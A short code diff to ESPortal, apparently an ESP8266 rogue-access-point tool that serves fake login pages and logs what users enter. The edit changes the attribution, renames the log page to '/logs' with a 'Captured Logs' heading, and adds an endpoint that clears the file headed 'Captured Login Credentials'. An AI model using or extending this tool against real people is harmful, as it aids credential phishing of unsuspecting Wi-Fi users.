@@ -1,5 +1,5 @@
 /*
- *ESPortal by Corey Harding 
+ * Original by Corey Harding, edited by G. R. Casanova
  * www.legacysecuritygroup.com
  * Configure access point name and up to 3 custom domains and login urls in config.h
  * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
@@ -151,13 +151,25 @@ void setup() {
   });
 
   // Logging Page
-  webServer.on("/esportal/log", [](){
-    webString="<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
+  webServer.on("/logs", [](){
+    webString="<html><body><h1>Captured Logs</h1><br><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
     serialString = f.readString();
     webString += serialString;
     f.close();
-    webString += "</pre></body></html>";
+    webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
+    webServer.send(200, "text/html", webString);
+    Serial.println(serialString);
+    serialString="";
+    webString="";
+  });
+
+  // Clear all logs
+  webServer.on("/logs/clear", [](){
+    webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
+    File f = SPIFFS.open(LOGFILE, "w");
+    f.println("Captured Login Credentials:");
+    f.close();
     webServer.send(200, "text/html", webString);
     Serial.println(serialString);
     serialString="";
